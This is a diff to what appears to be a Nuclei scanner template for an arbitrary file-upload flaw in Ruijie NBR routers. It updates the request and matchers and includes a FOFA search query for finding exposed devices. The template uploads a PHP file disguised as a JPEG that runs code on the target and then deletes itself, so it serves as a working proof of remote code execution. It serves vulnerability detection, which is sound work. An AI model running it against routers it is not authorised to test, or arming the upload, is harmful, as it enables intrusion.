@@ -12,10 +12,11 @@ info:
     verified: true
     max-request: 2
     fofa-query: app="Ruijie-NBR路由器"
-  tags: ruijie,file-upload,intrusive,nbr
+  tags: ruijie,fileupload,intrusive,nbr
+
 variables:
   filename: "{{rand_base(6)}}"
-  string: "{{rand_base(5)}}"
+  string: "ruijie-nbr-fileupload"
 
 http:
   - raw:
@@ -26,16 +27,14 @@ http:
         Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
         Content-Type: image/jpeg
 
-        <?php echo "{{string}}"; unlink(__FILE__); ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
       - |
         GET /ddi/server/upload/{{filename}}.php HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
-      - type: dsl
-        dsl:
-          - status_code_1 == 200 && contains(body_1,"jsonrpc")
-          - status_code_2 == 200 && contains(body_2,"{{string}}")
-        condition: and
-
-# digest: 4a0a0047304502205aec15506f551f025b3d99fd40a127b9e9c4787e16d32915d121b954cf089721022100d8fe6d2cbdf3db8ebc017eee812656570ec642c8ae99dea9b26c64c427570fee:922c64590222798bb761d5b6d8e72950
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 490a0046304402207a4c82036fd5ca92c6688b2b58f7f9f91f9e9f17893be3f057547addc4bf5cfa0220426b2ecb4c3ae909e44e898c73c02180888b4ca103cceb5fcc0d5f0c28e2559f:922c64590222798bb761d5b6d8e72950
